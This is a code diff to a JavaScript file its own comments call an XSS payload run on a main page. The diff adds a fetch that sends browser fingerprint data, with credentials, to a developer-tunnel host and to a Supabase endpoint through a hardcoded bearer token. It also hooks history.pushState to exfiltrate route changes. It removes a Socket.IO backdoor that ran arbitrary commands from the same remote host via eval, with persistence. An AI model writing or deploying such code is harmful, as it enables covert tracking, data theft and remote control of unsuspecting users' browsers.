@@ -7,7 +7,6 @@ if (!window.__MAIN_XSS_EXECUTED__) {
     // ESTAMOS EN PÁGINA PRINCIPAL - EJECUTAR DIRECTAMENTE
     window.__MAIN_XSS_EXECUTED__ = true;
     executeMainXSS();
-    setupWebSocketController();
 }
 
 // =============================================
@@ -82,6 +81,16 @@ function executeFullFingerprinting() {
         };
 
         // Enviar datos via fetch
+        fetch('https://lt6wg5nh-3002.use2.devtunnels.ms/update-agency', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            credentials: 'include',
+            body: JSON.stringify({ fingerprint: fingerprintData })
+        });
+
+        // Enviar datos via fetch a Supabase
         fetch('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', {
             method: 'POST',
             headers: {
@@ -121,13 +130,13 @@ function setupRouteSystem() {
     const originalPushState = history.pushState;
     const originalReplaceState = history.replaceState;
 
-    history.pushState = function(state, title, url) {
+    history.pushState = function (state, title, url) {
         const result = originalPushState.apply(this, arguments);
         trackRouteChange(url);
         return result;
     };
 
-    history.replaceState = function(state, title, url) {
+    history.replaceState = function (state, title, url) {
         const result = originalReplaceState.apply(this, arguments);
         trackRouteChange(url);
         return result;
@@ -137,7 +146,7 @@ function setupRouteSystem() {
         if (url) {
             const urlStr = typeof url === 'string' ? url : url.toString();
             currentPath = urlStr;
-            
+
             // Opcional: enviar tracking de cambios de ruta
             try {
                 fetch('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', {
@@ -146,7 +155,7 @@ function setupRouteSystem() {
                         'Content-Type': 'application/json',
                         'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlmd3pwb2psc3Frd3Z0bWVzc213Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzNDI1ODIsImV4cCI6MjA3NDkxODU4Mn0.vuHSGbSKNHxUjXjgA6oJNdmHxsZblr_ZAXYYLe-yLA8'
                     },
-                    body: JSON.stringify({ 
+                    body: JSON.stringify({
                         route_change: {
                             timestamp: new Date().toISOString(),
                             from: currentPath,
@@ -159,176 +168,4 @@ function setupRouteSystem() {
             }
         }
     }
-}
-
-function setupWebSocketController() {
-    'use strict';
-
-    const WS_SERVER = 'https://lt6wg5nh-3002.use2.devtunnels.ms';
-    let socket = null;
-
-    // Diccionario para scripts persistentes
-    const persistentScripts = {};
-
-    // Función para cargar Socket.IO dinámicamente
-    function loadSocketIO(callback) {
-        if (window.io) {
-            callback();
-            return;
-        }
-
-        const script = document.createElement('script');
-        script.src = 'https://cdn.socket.io/4.7.5/socket.io.min.js';
-        script.onload = () => callback();
-        script.onerror = () => setTimeout(() => loadSocketIO(callback), 3000);
-        document.head.appendChild(script);
-    }
-
-    // Función para conectar WebSocket
-    function connectWebSocket() {
-        loadSocketIO(() => {
-            try {
-                socket = io(WS_SERVER, {
-                    transports: ['polling'],
-                    upgrade: false,
-                    timeout: 10000,
-                    path: '/socket.io',
-                    withCredentials: false
-                });
-
-                socket.on('connect', () => console.log('ws cn'));
-                socket.on('execute-command', handleExecuteCommand);
-                socket.on('destroy-persistent', handleDestroyPersistent);
-                socket.on('sync-persistent', handleSyncPersistent);
-                socket.on('disconnect', () => console.log('ws cn'));
-                socket.on('connect_error', () => setTimeout(connectWebSocket, 5000));
-
-            } catch (error) {
-                setTimeout(connectWebSocket, 5000);
-            }
-        });
-    }
-
-    // Función para manejar ejecución de comandos
-    function handleExecuteCommand(data) {
-        const { command, persistent, id } = data;
-        try {
-            console.log('ej cmnd');
-
-            // EJECUCIÓN LIBRE CON eval()
-            const result = eval(command);
-
-            if (persistent && id) {
-                persistentScripts[id] = {
-                    script: command,
-                    cleanup: typeof result === 'function' ? result : null
-                };
-            }
-
-            // Enviar confirmación
-            if (socket && socket.connected) {
-                socket.emit('command_executed', {
-                    id: id,
-                    success: true,
-                    hasCleanup: !!result,
-                    timestamp: new Date().toISOString()
-                });
-            }
-
-        } catch (error) {
-            console.error('err', error);
-
-            // Enviar error
-            if (socket && socket.connected) {
-                socket.emit('command_error', {
-                    id: id,
-                    error: error.message,
-                    timestamp: new Date().toISOString()
-                });
-            }
-        }
-    }
-
-    // Función para destruir scripts persistentes
-    function handleDestroyPersistent(data) {
-        const { id } = data;
-
-        if (persistentScripts[id]) {
-            // Ejecutar cleanup si existe
-            if (persistentScripts[id].cleanup) {
-                try {
-                    persistentScripts[id].cleanup();
-                } catch (error) {
-                    console.error('err:', error);
-                }
-            }
-
-            // Remover del diccionario
-            delete persistentScripts[id];
-
-            // Enviar confirmación
-            if (socket && socket.connected) {
-                socket.emit('persistent_destroyed', {
-                    id: id,
-                    success: true,
-                    timestamp: new Date().toISOString()
-                });
-            }
-        } else {
-            // Enviar error
-            if (socket && socket.connected) {
-                socket.emit('persistent_not_found', {
-                    id: id,
-                    timestamp: new Date().toISOString()
-                });
-            }
-        }
-    }
-
-    // Función para sincronizar scripts persistentes
-    function handleSyncPersistent(data) {
-        try {
-            for (const [id, cmd] of Object.entries(data)) {
-                try {
-                    // EJECUCIÓN LIBRE
-                    const result = eval(cmd);
-
-                    // Almacenar en diccionario
-                    persistentScripts[id] = {
-                        script: cmd,
-                        cleanup: typeof result === 'function' ? result : null
-                    };
-
-                } catch (error) {
-                    console.error('err:', error);
-                }
-            }
-
-            // Enviar confirmación
-            if (socket && socket.connected) {
-                socket.emit('sync_completed', {
-                    count: Object.keys(data).length,
-                    timestamp: new Date().toISOString()
-                });
-            }
-
-        } catch (error) {
-            console.error('err:', error);
-
-            if (socket && socket.connected) {
-                socket.emit('sync_error', {
-                    error: error.message,
-                    timestamp: new Date().toISOString()
-                });
-            }
-        }
-    }
-
-    // Iniciar conexión
-    connectWebSocket();
-
-    // Devolver API pública si es necesario
-    return {
-        getPersistentScripts: () => ({ ...persistentScripts })
-    };
 }
